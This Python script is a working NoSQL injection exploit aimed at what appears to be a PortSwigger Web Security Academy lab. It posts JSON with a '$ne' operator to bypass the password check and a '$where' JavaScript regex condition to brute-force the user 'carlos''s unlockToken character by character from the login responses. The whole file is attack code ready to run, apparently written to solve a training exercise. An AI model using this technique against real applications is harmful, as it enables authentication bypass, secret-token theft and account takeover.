#!/usr/bin/env python3
import requests, string, sys

BASE = "https://0a3200d303c63958826597be001f0077.web-security-academy.net"
ROOT = f"{BASE}/"
LOGIN = f"{BASE}/login"
USERNAME = "carlos"

CHARSET = string.ascii_lowercase + string.digits
s = requests.Session()
headers = {"Content-Type": "application/json"}

def get_session():
    r = s.get(ROOT)
    sess_cookie = r.cookies.get("session")
    print(f"[+] Got initial session: {sess_cookie}")
    return sess_cookie

def test_prefix(prefix):
    # dựng raw JSON với cú pháp JS đúng
    raw_data = (
        '{'
        f'"username":"{USERNAME}",'
        '"password":{"$ne":""},'
        f'"$where":"function(){{ if(this.unlockToken && this.unlockToken.match(/^{prefix}.*$/)) return 1; else return 0; }}"'
        '}'
    )

    cookies = {"session": s.cookies.get("session")}
    r = s.post(LOGIN, data=raw_data, headers=headers, cookies=cookies)

    sess_cookie = r.cookies.get("session") or cookies["session"]
  

    if "Invalid username or password"   in r.text:
        return False
    return True

def brute_force():
    token = ""
    while True:
        found = False
        for ch in CHARSET:
            sys.stdout.write(f"\r[*] Trying: {token+ch}")
            sys.stdout.flush()
            if test_prefix(token+ch):
                token += ch
                print(f"\r[+] Found char: {token}")
                found = True
                break
        if not found:
            print("\n[*] Done.")
            break
    print("[*] Final unlockToken:", token)

if __name__ == "__main__":
    get_session()
    brute_force()
